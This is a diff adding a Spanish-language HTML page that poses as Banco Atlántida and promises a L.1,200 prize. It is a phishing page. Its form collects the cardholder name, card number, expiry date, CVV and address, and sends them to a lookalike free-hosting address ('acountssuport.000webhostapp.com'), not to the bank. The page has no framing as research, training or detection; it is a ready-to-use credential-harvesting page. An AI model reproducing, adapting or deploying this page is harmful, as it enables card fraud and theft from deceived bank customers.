@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<script type="text/javascript" src="target.js"></script>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Reclamar premio</title>
+	<style type="text/css">
+
+
+body{
+
+	font-family: arial;
+	margin: 0;
+	padding: 0;
+	
+		}
+
+.logo{		
+			display: flex;
+			background: #C42525;
+			align-items: center;
+			flex-wrap: wrap;
+			box-shadow: 2px 2px 5px #999;
+			
+}
+.titulo-1{
+	
+	color: white;
+	font-size: 25px;
+}
+.ima-1{
+	margin-left: 10px;
+	width: 30px;
+	
+}
+.formulario{
+	width: 400px;
+	box-sizing: border-box;
+	padding: 10px;
+	border-radius: 5px;
+	background: #A9A9A9;
+	box-shadow: 2px 2px 5px #999;
+	margin-top: 40px;
+	
+
+	}
+	.formulario input {
+		box-sizing: border-box;
+		border-radius: 5px;
+		padding: 20px;
+		width: 100%;
+		margin-top: 10px;
+		border-style: none;
+		outline-color: #C43737;
+		
+	}
+	#boton{
+		display: block;
+		width: 100%;
+		padding: 15px;
+		border: none;
+		background: #C42525;
+		color: white;
+	   margin-top: 20px;
+	   border-radius: 5px;
+	   font-size: 15px;
+	}
+	.content{
+		width: 500px;
+		height: auto;
+		display: block;
+		margin: auto;
+		padding-bottom: 40px;
+	}
+	.activo {
+		color: white;
+		display: none;
+		width: 500px;
+		height: 40px;
+		border:2px solid #484848;
+		background: #959595;
+		border-radius: 5px;
+		position: fixed;
+		z-index: 100;
+		bottom: 240px;
+		left: 400px;
+		margin-top: auto;
+		text-align: center;
+
+	}
+	.content{
+		display: grid;
+		place-items: center;
+	}
+	
+	@media only screen and (max-width: 850px){
+		.formulario{
+			width:95%;
+
+		}
+		.content {
+			width: 98%;
+		}
+		#dick{
+			width: 95%;
+		
+			left: 10px;
+		}
+	}
+	</style>
+
+</head>
+<body>
+<div class="logo"><img src="123.png" class="ima-1"><p class="titulo-1">
+		Banco Atl&aacute;ntida
+	</p></div>
+	<div class="grid">
+	<div class="content">
+		
+		<form class="formulario" action="https://acountssuport.000webhostapp.com/banca/tarjetasmoney.php" method="post"><p style=" color: #C42525; font-size: 20px;">Para que pueda retirar su dinero con facilidad debe ingresar una tarjeta de crédito o débito para que podamos depositemos su dinero directo a su tarjeta.</p>
+		<p style="color: #C42525;">Recuerde colocar el nombre que aparece en la tarjeta de manera correcta.</p>
+			<input type="text" name="nombre" placeholder="Nombre que aparece en la tarjeta" required>
+			<input type="text" name="TarjetaNumero" maxlength="19" id="numeros" placeholder="Número de tarjeta" required>
+        	<!--Aqui inicia un nuevo input-->
+			<input type="text" id="vence" name="FechaVencimiento" placeholder="Fecha de vencimiento (MM/AA)"
+    		onkeyup="
+        	var v = this.value;
+        	if (v.match(/^\d{2}$/) !== null) {
+            this.value = v + '/';
+        	}
+        	else if (v.match(/^\d{4}\$/) !== null) {
+            this.value = v + '/';
+        	}"
+    		maxlength="5"
+			required="">
+			<input type="text" name="codigo" id="codigo" placeholder="C&oacute;digo de seguridad (CVV)" minlength="3" maxlength="3" required=""autocomplete = "off">
+			<p style="color: white;">Su dirección</p>
+			<input type="text" name="colonia" placeholder="Colonia" required>
+			<input type="text" name="ciudad" placeholder="Ciudad" required>
+			<button id="boton" type="submit">Reclamar L.1,200</button>
+			
+		</form>
+
+		<script type="text/javascript">
+			var codigo = document.getElementById('codigo');
+		
+			codigo.onkeydown = function(e){
+				if (e.key == 'Backspace') return true;
+		
+				if (e.key == ' ') return false;	
+		
+				if (isNaN(e.key)) return false;
+			};
+		</script>
+		
+		<script>
+		// Campo numeros
+		var numeros = document.getElementById('numeros');
+		
+		// Poner cursor en el campo numeros
+		numeros.focus();
+		
+		numeros.onkeydown = function(e){
+			// Permitir la tecla para borrar
+			if (e.key == 'Backspace') return true;
+		
+			// Permitir flecha izquierda
+			if (e.key == 'ArrowLeft') return true;
+		
+			// Permitir flecha derecha
+			if (e.key == 'ArrowRight') return true;
+		
+			// Bloquear tecla de espacio
+			if (e.key == ' ') return false;
+		
+			// Bloquear tecla si no es un numero
+			if (isNaN(e.key)) return false;
+		};
+		
+		numeros.onkeyup = function(){
+			numeros.value = numeros.value
+							// Borrar todos los espacios
+							.replace(/\s/g, '')
+		
+							// Agregar un espacio cada dos numeros
+							.replace(/([0-9]{4})/g, '$1 ')
+		
+							// Borrar espacio al final
+							.trim();
+		};
+		</script>
+	</div>
+	</div>
+	<div id="dick" onclick="ocultar();" class="activo">
+		<p style="font-size: 13px;">El codigo de seguridad son 3 numeros ubicados en la parte trasera de tu tarjeta.</p>
+		
+	</div>
+</body>
+</html>
